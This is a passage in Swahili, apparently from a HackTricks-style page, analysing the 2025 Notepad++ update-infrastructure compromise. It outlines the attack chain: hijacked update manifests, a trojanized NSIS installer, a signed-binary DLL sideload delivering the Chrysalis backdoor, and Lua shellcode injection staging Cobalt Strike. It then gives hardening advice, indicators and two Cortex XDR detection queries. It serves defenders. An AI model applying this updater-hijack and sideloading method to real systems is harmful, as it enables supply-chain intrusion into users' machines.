Kati ya Juni 2025 na Desemba 2025, washambuliaji waliovamia miundombinu ya hosting iliyo nyuma ya mtiririko wa update wa Notepad++ waliwasilisha manifests hasidi kwa waathiriwa waliochaguliwa pekee. Updaters za zamani zilizotumia WinGUp hazikuthibitisha kikamilifu uhalisi wa update, hivyo jibu hasidi la XML lingeweza kuelekeza clients kwenye URLs zinazodhibitiwa na washambuliaji. Kwa kuwa client ilikubali maudhui ya HTTPS bila kulazimisha matumizi ya certificate chain inayoaminika pamoja na PE signature halali kwenye installer iliyopakuliwa, waathiriwa walipakua na kutekeleza `update.exe` ya NSIS iliyowekewa trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Mtiririko wa kiutendaji (hakuna exploit ya ndani inayohitajika):
1. **Kuingilia miundombinu**: vamiа CDN/hosting na ujibu ukaguzi wa update kwa metadata ya mshambuliaji inayoelekeza kwenye URL hasidi ya upakuaji.
2. **NSIS iliyowekewa trojan**: installer hupakua/kutekeleza payload na kutumia misururu miwili ya utekelezaji:
   - **Tumia binary iliyosainiwa uliyoleta mwenyewe pamoja na sideload**: jumuisha `BluetoothService.exe` iliyosainiwa ya Bitdefender na uweke `log.dll` hasidi kwenye njia yake ya utafutaji. Binary iliyosainiwa inapotekelezwa, Windows hupakia `log.dll` kwa sideload; DLL hii hufungua usimbaji na kupakia kwa reflectively backdoor ya Chrysalis (iliyolindwa na Warbird + API hashing ili kuzuia ugunduzi wa static).
   - **Uingizaji wa shellcode kwa script**: NSIS hutekeleza script ya Lua iliyokusanywa ambayo hutumia Win32 APIs (k.m., `EnumWindowStationsW`) kuingiza shellcode na kuandaa Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mambo ya hardening/ugunduzi kwa auto-updater yoyote:
- Lazimisha **uthibitishaji wa certificate + signature** wa installer iliyopakuliwa (bandika signer wa vendor, kataa CN/chain zisizolingana) na usaini manifest ya update yenyewe (k.m., XMLDSig). Zuia redirects zinazodhibitiwa na manifest isipokuwa zimethibitishwa.
- Chukulia **sideloading ya binary iliyosainiwa uliyoleta mwenyewe** kama njia ya ugunduzi baada ya upakuaji: toa arifa pale EXE iliyosainiwa ya vendor inapopakia jina la DLL kutoka nje ya njia yake ya kawaida ya usakinishaji (k.m., Bitdefender inapopakia `log.dll` kutoka Temp/Downloads), na pale updater inapoweka/kutekeleza installers kutoka temp zenye signatures zisizo za vendor.
- Fuatilia **viashiria mahususi vya malware** vilivyoonekana katika mnyororo huu (vinafaa kama njia za jumla za uchunguzi): mutex `Global\Jdhfv_1.0.1`, uandishi usio wa kawaida wa `gup.exe` kwenye `%TEMP%`, na hatua za uingizaji wa shellcode zinazoendeshwa na Lua.
- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na matoleo ya baadaye: XML inayorejeshwa sasa imesainiwa (XMLDSig), na builds mpya zaidi zinalazimisha uthibitishaji wa certificate + signature wa installer iliyopakuliwa badala ya kuamini usafirishaji pekee.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading ya EXE iliyosainiwa na Bitdefender ya <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikiendesha kisakinishi kisicho cha Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Miundo hii inatumika kwa updater yoyote inayokubali manifests zisizosainiwa au isiyothibitisha saini za watia-saini wa installer—network hijack + installer hasidi + sideloading iliyosainiwa kwa cheti chako mwenyewe husababisha remote code execution kwa kisingizio cha masasisho “yanayoaminika”.

---
## References
- [1] [Ushauri wa usalama – Netskope Client for Windows – Kuinua Privilege kwa Kutumia Seva Feki (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Ushauri wa Usalama wa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Plugin ya Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Mteja/exploit wa Netskope IPC](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Kunyakua ASUS DriverHub, MSI Center, Acer Control Centre na Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Kuinua Privilege kupitia faili zinazoweza kuandikwa katika Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Kuinua privilege katika Windows agent](https://checkmk.com/werk/16361)
- [10] [PoC za sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Wahusika wa Kitaifa Wanyonyaji Mnyororo wa Ugavi wa Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – Taarifa ya sasisho kuhusu tukio la miundombinu iliyotekwa](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Kukwepa marekebisho ya CVE-2025-0309 katika Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Kugundua hitilafu za kuinua privilege katika Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
